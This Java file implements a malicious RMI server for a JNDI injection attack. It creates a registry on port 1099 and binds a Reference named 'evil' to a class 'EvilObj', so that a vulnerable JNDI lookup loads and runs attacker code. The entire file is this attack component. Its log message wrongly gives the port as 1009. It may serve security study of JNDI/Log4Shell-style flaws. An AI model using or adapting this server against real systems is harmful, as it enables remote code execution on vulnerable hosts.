package com.yicaida.provider.service.impl;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Creat RIM registy on port 1009");
            Reference reference = new Reference("com.yicaida.provider.service.impl.EvilObj", "com.yicaida.provider.service.impl.EvilObj", "");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
